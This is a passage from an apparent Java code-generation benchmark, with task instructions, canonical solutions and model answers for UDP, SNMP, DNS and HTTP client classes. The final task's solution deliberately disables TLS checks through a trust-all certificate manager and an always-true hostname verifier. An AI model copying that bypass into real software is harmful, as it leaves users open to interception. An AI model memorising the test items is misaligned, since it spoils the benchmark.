    "Instruction": "Task Description: Implement a UDP-based client class for network communication that can send and receive datagram packets, manage connections, and handle timeouts.\n\nClass Description: ConnectDatagram is a UDP client class that extends a base Connection class. It provides functionality for sending and receiving XDR-encoded data over UDP, managing socket connections, and handling peer address information.\n\nAttributes:\n- ds: DatagramSocket - The UDP socket used for communication\n- dp: DatagramPacket - The packet used for receiving data\n- addr: InetAddress - The IP address of the server/peer\n\nMethods:\n- ConnectDatagram(String server, int port, int maxSize) -> void - Constructor that initializes the UDP connection with server address, port, and maximum packet size\n- sendOne(Xdr x) -> void - Sends an XDR-encoded packet to the server\n- receiveOne(Xdr x, int timeout) -> void - Receives an XDR-encoded packet with a specified timeout\n- getPeer() -> InetAddress - Returns the address of the peer that sent the last received packet\n- dropConnection() -> void - Placeholder for connection cleanup (UDP is connectionless)\n- checkConnection() -> void - Placeholder for connection verification (UDP is connectionless)\n- finalize() -> void - Cleans up resources by closing the socket when the object is garbage collected",
    "Canonical_solution": "import java.io.*;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ConnectDatagram extends Connection {\n\n    DatagramSocket ds;\n    DatagramPacket dp;\n    InetAddress addr;\n\n    public ConnectDatagram(String server, int port, int maxSize) throws IOException {\n        super(server, port, \"udp\", maxSize);\n        ds = new DatagramSocket();\n        addr = InetAddress.getByName(server);\n        start();\n    }\n\n    void sendOne(Xdr x) throws IOException {\n        ds.send(new DatagramPacket(x.xdr_buf(), x.xdr_offset(), addr, port));\n    }\n\n    void receiveOne(Xdr x, int timeout) throws IOException {\n        ds.setSoTimeout(timeout);\n        dp = new DatagramPacket(x.xdr_buf(), x.xdr_buf().length);\n        ds.receive(dp);\n    }\n\n    InetAddress getPeer() {\n        return dp.getAddress();\n    }\n\n    void dropConnection() {\n    }\n\n    void checkConnection() {\n    }\n\n    protected void finalize() throws Throwable {\n        if (ds != null) {\n            ds.close();\n            ds = null;\n        }\n        super.finalize();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.*;\n\npublic class ConnectDatagram extends Connection {\n    private DatagramSocket ds;\n    private DatagramPacket dp;\n    private InetAddress addr;\n\n    public ConnectDatagram(String server, int port, int maxSize) throws UnknownHostException, SocketException {\n        addr = InetAddress.getByName(server);\n        ds = new DatagramSocket();\n        dp = new DatagramPacket(new byte[maxSize], maxSize);\n    }\n\n    public void sendOne(Xdr x) throws IOException {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        DataOutputStream dos = new DataOutputStream(baos);\n        x.encode(dos);\n        byte[] buffer = baos.toByteArray();\n        dp.setData(buffer);\n        dp.setLength(buffer.length);\n        dp.setAddress(addr);\n        dp.setPort(port);\n        ds.send(dp);\n    }\n\n    public void receiveOne(Xdr x, int timeout) throws IOException {\n        ds.setSoTimeout(timeout);\n        ds.receive(dp);\n        ByteArrayInputStream bais = new ByteArrayInputStream(dp.getData(), 0, dp.getLength());\n        DataInputStream dis = new DataInputStream(bais);\n        x.decode(dis);\n    }\n\n    public InetAddress getPeer() {\n        return dp.getAddress();\n    }\n\n    public void dropConnection() {\n        // No-op for UDP as it's connectionless\n    }\n\n    public void checkConnection() {\n        // No-op for UDP as it's connectionless\n    }\n\n    @Override\n    protected void finalize() throws Throwable {\n        try {\n            ds.close();\n        } finally {\n            super.finalize();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 611,
    "Instruction": "Task Description: Implement a UDP communication handler class that facilitates sending UDP messages and manages socket resources.\n\nClass Description: The UdpCommunicationHandler class provides functionality for sending UDP messages to a specified IP address and port, and includes methods for proper socket cleanup. It's designed for scenarios where a client needs to send confirmation messages to a server.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) -> void - Sends a predefined success message (MSG_FILE_RECEIVER_INIT_SUCCESS) to the specified IP address and port. The socket is created on a port number that's one higher than the target port. Throws Exception if communication fails.\n- closeSocket() -> void - Closes and cleans up the DatagramSocket resource if it exists. This method should be called when the communication is complete to release system resources.\n\nInput:\n- For sendFileReceiverInitSuccessMsg: IpPortInfo object containing target IP address (InetAddress) and port number (int)\n- For closeSocket: None\n\nOutput:\n- For sendFileReceiverInitSuccessMsg: None (void), but sends UDP packet to specified destination\n- For closeSocket: None (void)",
    "Canonical_solution": "import android.util.Log;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>start\");\n        mDatagramSocket = new DatagramSocket(ipPortInfo.getPort() + 1);\n        byte[] sendData = Constant.MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes(BaseTransfer.UTF_8);\n        DatagramPacket sendPacket = new DatagramPacket(\n            sendData, \n            sendData.length, \n            ipPortInfo.getInetAddress(), \n            ipPortInfo.getPort()\n        );\n        mDatagramSocket.send(sendPacket);\n        Log.i(\"UdpCommunicationHandler\", \"Send Msg To FileSender######>>>\" + Constant.MSG_FILE_RECEIVER_INIT_SUCCESS);\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>end\");\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        String msg = \"FILE_RECEIVER_INIT_SUCCESS\";\n        byte[] buffer = msg.getBytes();\n        InetAddress IPAddress = ipPortInfo.getIp();\n        int port = ipPortInfo.getPort() + 1;\n        mDatagramSocket = new DatagramSocket(port);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, IPAddress, port);\n        mDatagramSocket.send(packet);\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null && !mDatagramSocket.isClosed()) {\n            mDatagramSocket.close();\n        }\n    }\n}\n\nclass IpPortInfo {\n    private InetAddress ip;\n    private int port;\n\n    public IpPortInfo(InetAddress ip, int port) {\n        this.ip = ip;\n        this.port = port;\n    }\n\n    public InetAddress getIp() {\n        return ip;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n```"
  },
  {
    "Task_id": 612,
    "Instruction": "Task Description: Create a UDP server class in Java that can send messages to a specified target host and port using UDP protocol.\n\nClass Description: The UDPServer class implements a simple UDP server that can send messages to other hosts. It encapsulates the Java DatagramSocket functionality for UDP communication.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- port: int - The port number the server is bound to\n\nMethods:\n- UDPServer(int port) -> void - Constructor that creates a DatagramSocket bound to the specified port\n- send(String message, String targetHost, int targetPort) -> void - Sends a message to the specified target host and port using UDP\n- close() -> void - Closes the UDP socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPServer {\n\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws Exception {\n        this.port = port;\n        this.socket = new DatagramSocket(port);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        DatagramPacket packet = new DatagramPacket(\n            message.getBytes(),\n            message.length(),\n            InetAddress.getByName(targetHost),\n            targetPort\n        );\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPServer {\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws Exception {\n        this.port = port;\n        socket = new DatagramSocket(port);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        InetAddress address = InetAddress.getByName(targetHost);\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 613,
    "Instruction": "Task Description: Create a Java class that implements a UDP socket for SNMP communication, capable of sending and receiving datagram packets asynchronously while handling errors and resource cleanup properly.\n\nClass Description: The SnmpSocket class provides UDP socket functionality for SNMP communication, managing packet transmission and reception in a separate thread. It includes methods for sending packets, checking socket validity, and proper resource cleanup. The class implements Runnable to handle incoming packets asynchronously.\n\nAttributes:\n_socket: [DatagramSocket] - The UDP socket instance for communication\n_dgramHdlr: [SnmpResponseHandler] - Handler for processing received datagrams\n_sockThread: [Thread] - Thread for asynchronous packet reception\n_buffer: [byte[]] - Buffer for storing incoming packet data\nisClosing: [boolean] - Flag indicating if the socket is being closed\n_socketPort: [int] - Port number the socket is bound to\nresponseBufSize: [int] - Size of the response buffer\n\nMethods:\nConstructor: [SnmpSocket](SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) -> [void] - Initializes the UDP socket and starts the receiver thread\nsendPacket: [sendPacket](byte[] buff, int length, InetAddress addr, int port) -> [void] - Sends a datagram packet with specified data to given address and port\nsendPacket: [sendPacket](DatagramPacket dgrmpkt) -> [void] - Sends a prepared datagram packet\nisValid: [isValid]() -> [boolean] - Checks if the socket is in a valid state\nclose: [close]() -> [void] - Closes the socket and cleans up resources\nrun: [run]() -> [void] - Main thread method for receiving packets (implements Runnable)\nfinalize: [finalize]() -> [void] - Ensures proper cleanup when object is garbage collected\nhandleJavaError: [handleJavaError](Throwable thr) -> [void] - Handles Java errors during operation\nhandleDatagram: [handleDatagram](DatagramPacket dgrmpkt) -> [void] - Processes received datagrams using the response handler",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\nimport java.util.logging.Level;\n\nfinal class SnmpSocket implements java.lang.Runnable {\n\n    private DatagramSocket _socket = null;\n    private SnmpResponseHandler _dgramHdlr = null;\n    private Thread _sockThread = null;\n    private byte[] _buffer = null;\n    private transient boolean isClosing = false;\n\n    int _socketPort = 0;\n    int responseBufSize = 1024;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) throws SocketException {\n        _socket = new DatagramSocket(0, addr);\n        _socketPort = _socket.getLocalPort();\n        responseBufSize = bufferSize;\n        _buffer = new byte[responseBufSize];\n        _dgramHdlr = rspHdlr;\n        _sockThread = new Thread(this, \"SnmpSocket\");\n        _sockThread.start();\n    }\n\n    public synchronized void sendPacket(byte[] buff, int length, InetAddress addr, int port) throws IOException {\n        DatagramPacket dgrmpkt = new DatagramPacket(buff, length, addr, port);\n        sendPacket(dgrmpkt);\n    }\n\n    public synchronized void sendPacket(DatagramPacket dgrmpkt) throws IOException {\n        if (isValid()) {\n            _socket.send(dgrmpkt);\n        } else {\n            throw new IOException(\"Invalid state of SNMP datagram socket.\");\n        }\n    }\n\n    public synchronized boolean isValid() {\n        return _socket != null && _sockThread != null && _sockThread.isAlive();\n    }\n\n    public synchronized void close() {\n        isClosing = true;\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        if (_sockThread != null && _sockThread.isAlive()) {\n            _sockThread.interrupt();\n            try {\n                _sockThread.join();\n            } catch (InterruptedException e) {\n            }\n            _sockThread = null;\n        }\n    }\n\n    @Override\n    public void run() {\n        Thread.currentThread().setPriority(8);\n        while (true) {\n            try {\n                DatagramPacket dgrmpkt = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(dgrmpkt);\n                if (isClosing)\n                    break;\n                if (dgrmpkt.getLength() <= 0)\n                    continue;\n                handleDatagram(dgrmpkt);\n                if (isClosing)\n                    break;\n            } catch (IOException io) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (Exception e) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (ThreadDeath d) {\n                close();\n                throw d;\n            } catch (Error err) {\n                handleJavaError(err);\n            }\n        }\n    }\n\n    @Override\n    protected synchronized void finalize() {\n        close();\n    }\n\n    private synchronized void handleJavaError(Throwable thr) {\n        if (thr instanceof OutOfMemoryError) {\n            Thread.yield();\n            return;\n        }\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        Thread.yield();\n    }\n\n    private synchronized void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.processDatagram(dgrmpkt);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SnmpSocket implements Runnable {\n    private DatagramSocket _socket;\n    private SnmpResponseHandler _dgramHdlr;\n    private Thread _sockThread;\n    private byte[] _buffer = new byte[1024];\n    private boolean isClosing = false;\n    private int _socketPort;\n    private int responseBufSize = 1024;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) throws IOException {\n        this._dgramHdlr = rspHdlr;\n        this.responseBufSize = bufferSize;\n        this._socket = new DatagramSocket(addr);\n        this._socketPort = _socket.getLocalPort();\n        this._sockThread = new Thread(this);\n        this._sockThread.start();\n    }\n\n    public void sendPacket(byte[] buff, int length, InetAddress addr, int port) throws IOException {\n        DatagramPacket pkt = new DatagramPacket(buff, length, addr, port);\n        sendPacket(pkt);\n    }\n\n    public void sendPacket(DatagramPacket dgrmpkt) throws IOException {\n        _socket.send(dgrmpkt);\n    }\n\n    public boolean isValid() {\n        return !_socket.isClosed();\n    }\n\n    public synchronized void close() {\n        if (!isClosing) {\n            isClosing = true;\n            _socket.close();\n            try {\n                _sockThread.join();\n            } catch (InterruptedException e) {\n                handleJavaError(e);\n            }\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!isClosing) {\n            DatagramPacket pkt = new DatagramPacket(_buffer, _buffer.length);\n            try {\n                _socket.receive(pkt);\n                handleDatagram(pkt);\n            } catch (IOException e) {\n                handleJavaError(e);\n            }\n        }\n    }\n\n    @Override\n    protected void finalize() throws Throwable {\n        try {\n            close();\n        } finally {\n            super.finalize();\n        }\n    }\n\n    private void handleJavaError(Throwable thr) {\n        // Handle Java error here\n    }\n\n    private void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.processPacket(dgrmpkt);\n    }\n}\n```"
  },
  {
    "Task_id": 615,
    "Instruction": "Task Description: Implement a DNS UDP client class that can resolve DNS queries (A records and TXT records) by communicating with DNS servers over UDP.\n\nClass Description: The DnsUdpClient class provides functionality to send DNS queries to specified DNS servers and process the responses. It supports resolving domain names to IPv4 addresses (A records) and retrieving text records (TXT records).\n\nAttributes:\nDNS_SERVERS: InetSocketAddress[] - An array of predefined DNS server addresses with their respective ports\n\nMethods:\nresolveAOverUdp: resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) -> List<Inet4Address> - Resolves a DNS A record query by sending it to the specified DNS server and returns a list of IPv4 addresses. Throws Exception if the operation fails.\n\ntoIps: toIps(byte[] buffer) -> List<Inet4Address> - Helper method that converts DNS response data into a list of IPv4 addresses by parsing A records.\n\nresolveTXTOverUdp: resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) -> String - Resolves a DNS TXT record query by sending it to the specified DNS server and returns the text content. Throws Exception if the operation fails.\n\ntoTXT: toTXT(byte[] buffer) -> String - Helper method that extracts TXT record data from DNS response and returns it as a string. Throws RuntimeException if no TXT record is found.",
    "Canonical_solution": "import net.sf.ivmaidns.dns.DNSConnection;\nimport net.sf.ivmaidns.dns.DNSMsgHeader;\nimport net.sf.ivmaidns.dns.DNSName;\nimport net.sf.ivmaidns.dns.DNSRecord;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private final static InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"208.67.222.222\", 443),\n            new InetSocketAddress(\"208.67.220.220\", 443),\n            new InetSocketAddress(\"199.91.73.222\", 3389),\n            new InetSocketAddress(\"87.118.100.175\", 110),\n            new InetSocketAddress(\"87.118.85.241\", 110),\n            new InetSocketAddress(\"77.109.139.29\", 110),\n            new InetSocketAddress(\"77.109.138.45\", 110)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(1000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toIps(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        List<Inet4Address> ips = new ArrayList<Inet4Address>();\n        for (DNSRecord record : records) {\n            if (DNSRecord.A == record.getRType()) {\n                if (record.getRData().length > 0) {\n                    ips.add((Inet4Address) record.getRData()[0]);\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(2000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toTXT(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private String toTXT(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        for (DNSRecord record : records) {\n            if (DNSRecord.TXT == record.getRType() && record.getRData().length > 0) {\n                return (String) record.getRData()[0];\n            }\n        }\n        throw new RuntimeException(\"not found\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.util.*;\n\npublic class DnsUdpClient {\n    private static final InetSocketAddress[] DNS_SERVERS = {\n        new InetSocketAddress(\"8.8.8.8\", 53),\n        new InetSocketAddress(\"8.8.4.4\", 53)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket requestPacket = new DatagramPacket(query, query.length, dnsServer);\n        DatagramPacket responsePacket = new DatagramPacket(new byte[1024], 1024);\n\n        socket.send(requestPacket);\n        socket.receive(responsePacket);\n        socket.close();\n\n        return toIps(responsePacket.getData());\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        List<Inet4Address> ips = new ArrayList<>();\n        // Parsing logic for A records goes here\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket requestPacket = new DatagramPacket(query, query.length, dnsServer);\n        DatagramPacket responsePacket = new DatagramPacket(new byte[1024], 1024);\n\n        socket.send(requestPacket);\n        socket.receive(responsePacket);\n        socket.close();\n\n        return toTXT(responsePacket.getData());\n    }\n\n    private String toTXT(byte[] buffer) {\n        // Extracting TXT record logic goes here\n        throw new RuntimeException(\"No TXT record found\");\n    }\n}\n```"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a class that handles preloading of HTTP content in the background using a thread pool, with support for cancellation and blacklisting of failed URLs.\n\nClass Description: The PreloadTask class is a Runnable implementation that preloads HTTP content from a given URL up to a specified length. It manages connection timeouts, handles failures by blacklisting URLs, and supports task cancellation. The class works with an HttpProxyCacheServer to get proxied URLs and executes tasks through an ExecutorService.\n\nAttributes:\n- mRawUrl: String - The original URL to be preloaded\n- mPosition: int - The position/index of this preload task (optional tracking)\n- mCacheServer: HttpProxyCacheServer - The proxy server used to get cached URLs\n- mIsCanceled: boolean - Flag indicating if the task was canceled\n- mIsExecuted: boolean - Flag indicating if the task was executed\n- blackList: static List<String> - Shared list of URLs that failed to load\n\nMethods:\n- run(): void - The main execution method called by the thread pool, which starts the preload task if not canceled\n- start(): void - Internal method that performs the actual HTTP request and content preloading\n- executeOn(ExecutorService executorService): void - Submits the task to the provided executor service\n- cancel(): void - Cancels the task if it has been executed but not completed",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class PreloadTask implements Runnable {\n\n    public String mRawUrl;\n    public int mPosition;\n    public HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private final static List<String> blackList = new ArrayList<>();\n\n    @Override\n    public void run() {\n        if (!mIsCanceled) {\n            start();\n        }\n        mIsExecuted = false;\n        mIsCanceled = false;\n    }\n\n    private void start() {\n        if (blackList.contains(mRawUrl)) return;\n        HttpURLConnection connection = null;\n        try {\n            String proxyUrl = mCacheServer.getProxyUrl(mRawUrl);\n            URL url = new URL(proxyUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5_000);\n            connection.setReadTimeout(5_000);\n            InputStream in = new BufferedInputStream(connection.getInputStream());\n            int length;\n            int read = -1;\n            byte[] bytes = new byte[8 * 1024];\n            while ((length = in.read(bytes)) != -1) {\n                read += length;\n                if (mIsCanceled || read >= PreloadManager.PRELOAD_LENGTH) {\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        if (mIsExecuted) return;\n        mIsExecuted = true;\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        if (mIsExecuted) {\n            mIsCanceled = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.List;\nimport java.util.concurrent.ExecutorService;\n\npublic class PreloadTask implements Runnable {\n    private final String mRawUrl;\n    private final int mPosition;\n    private final HttpProxyCacheServer mCacheServer;\n    private volatile boolean mIsCanceled = false;\n    private volatile boolean mIsExecuted = false;\n    public static final List<String> blackList = new ArrayList<>();\n\n    public PreloadTask(String url, int position, HttpProxyCacheServer cacheServer) {\n        this.mRawUrl = url;\n        this.mPosition = position;\n        this.mCacheServer = cacheServer;\n    }\n\n    @Override\n    public void run() {\n        if (!mIsCanceled && !blackList.contains(mRawUrl)) {\n            synchronized (this) {\n                if (!mIsCanceled) {\n                    mIsExecuted = true;\n                    start();\n                }\n            }\n        }\n    }\n\n    private void start() {\n        try {\n            URL url = new URL(mCacheServer.getProxyUrl(mRawUrl));\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5000);\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n            // Assuming we're only interested in the response code\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpURLConnection.HTTP_OK) {\n                blackList.add(mRawUrl);\n            }\n            connection.disconnect();\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        mIsCanceled = true;\n        synchronized (this) {\n            if (mIsExecuted) {\n                // Handle cancellation logic here if necessary\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling both HTTP and HTTPS connections, including SSL certificate verification bypass for HTTPS, and processing JSON responses.\n\nClass Description: XxlJobRemotingUtil is a utility class designed to handle remote HTTP communication with JSON payloads, particularly for interacting with the XXL-JOB scheduler. It provides methods for making POST requests with proper headers, timeout settings, and access token authentication.\n\nAttributes:\n- logger: Logger - SLF4J logger for error and debug logging\n- XXL_JOB_ACCESS_TOKEN: String - Constant string for the access token header name\n- trustAllCerts: TrustManager[] - Array of trust managers that don't validate certificates\n\nMethods:\n- trustAllHosts(HttpsURLConnection connection) -> void - Configures the HTTPS connection to trust all hosts and certificates\n- postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT - Makes an HTTP POST request with JSON payload and processes the JSON response\n\nMethod Details:\n1. trustAllHosts(HttpsURLConnection connection) -> void\n   - Input: HttpsURLConnection connection - The HTTPS connection to configure\n   - Description: Sets up SSL context to trust all certificates and hosts for the given HTTPS connection\n\n2. postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT\n   - Input:\n     - url: String - The target URL for the POST request\n     - accessToken: String - Authentication token for the request\n     - timeout: int - Read timeout in seconds\n     - requestObj: Object - The object to be serialized as JSON request body\n     - returnTargClassOfT: Class - The class type for deserializing the response\n   - Output: ReturnT - A generic return type containing either the successful response or error information\n   - Description: \n     1. Creates and configures an HTTP/HTTPS connection\n     2. Sets request headers including content type and access token\n     3. Serializes the request object to JSON and sends it\n     4. Reads and deserializes the JSON response\n     5. Handles errors and connection cleanup",
    "Canonical_solution": "import com.xxl.job.core.biz.model.ReturnT;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.*;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class XxlJobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    public static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n\n    private static final TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    }};\n\n    private static void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sc = SSLContext.getInstance(\"TLS\");\n            sc.init(null, trustAllCerts, new java.security.SecureRandom());\n            SSLSocketFactory newFactory = sc.getSocketFactory();\n            connection.setSSLSocketFactory(newFactory);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        }\n        connection.setHostnameVerifier(new HostnameVerifier() {\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n    }\n\n    public static ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            boolean useHttps = url.startsWith(\"https\");\n            if (useHttps) {\n                HttpsURLConnection https = (HttpsURLConnection) connection;\n                trustAllHosts(https);\n            }\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            if (requestObj != null) {\n                String requestBody = GsonTool.toJson(requestObj);\n                DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n                dataOutputStream.write(requestBody.getBytes(\"UTF-8\"));\n                dataOutputStream.flush();\n                dataOutputStream.close();\n            }\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                ReturnT returnT = GsonTool.fromJson(resultJson, ReturnT.class, returnTargClassOfT);\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) 